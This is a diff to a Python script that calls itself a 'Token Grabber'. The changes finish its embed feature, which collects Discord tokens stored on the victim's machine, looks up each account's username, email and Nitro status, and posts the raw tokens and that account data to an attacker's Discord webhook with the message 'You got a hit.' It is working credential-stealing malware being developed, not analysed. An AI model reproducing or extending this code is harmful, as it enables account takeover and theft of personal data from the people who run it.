@@ -1,5 +1,3 @@
-# TODO add embed support
-
 # CONFIGURATION:
 # your webhook URL
 WEBHOOK_URL = 'WEBHOOK HERE'
@@ -16,11 +14,8 @@ EXPERIMENTAL= False
 
 '''
 CHANGELOG:
-- added SEND_IP and SEND_PC_INFO options
-- added EMBED to MODE (not ready to use yet)
-- added EXPERIMANTAL bool
-- added getIP() function
-- added getUserInfo() function
+- added basic embed support
+- MODE = 'EMBED' works now
 '''
 
 
@@ -138,13 +133,13 @@ def main():
 
         
 
-        payload = json.dumps({'content': message})
+        payload = json.dumps({'username':'Token Grabber by Mega145','content': message})
 
         try:
             requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
         except:
             pass
-    elif MODE == 'EMBED' and EXPERIMENTAL:
+    elif MODE == 'EMBED':
         embeds = []
         for platform, path in paths.items():
             if not os.path.exists(path):
@@ -162,10 +157,10 @@ def main():
                        else:
                            nitro = False
                        user = f'{getUserInfo(token)["username"]}#{getUserInfo(token)["discriminator"]}'
-                       embed = {"title":user,"color":color,"description":"description","fields":[
+                       embed = {"title":user,'description':f'Token:\n```{token}```',"color":color,"fields":[
                            {
                                "name":'**Discord Account Info**',
-                               "value":f"NAME: {user}\nEMAIL: {raw_user['email']}\nNitro: {nitro}\n"
+                               "value":f"NAME: ``{user}``\nEMAIL: ``{raw_user['email']}``\nNitro: ``{nitro}``\n"
                            }
                        ]}
                        embeds.append(embed)
@@ -173,10 +168,11 @@ def main():
                         pass
 
         ping = '@everyone' if PING_ME else ''
-        message = {"username":"Token Grabber by MegaDev",'content':'You got a hit. ' + ping,"embeds":json.dumps(embeds)}
+        message = {"username":"Token Grabber by MegaDev",'content':'You got a hit. ' + ping,"embeds":embeds}
+        payload = json.dumps(message)
 
         print(message)
-        response = requests.post(WEBHOOK_URL,headers=headers,json=message)
+        response = requests.post(WEBHOOK_URL,headers=headers,data=payload.encode())
         print(response.text)
     else:
         print('MODE invalid or experimental is not enabled')
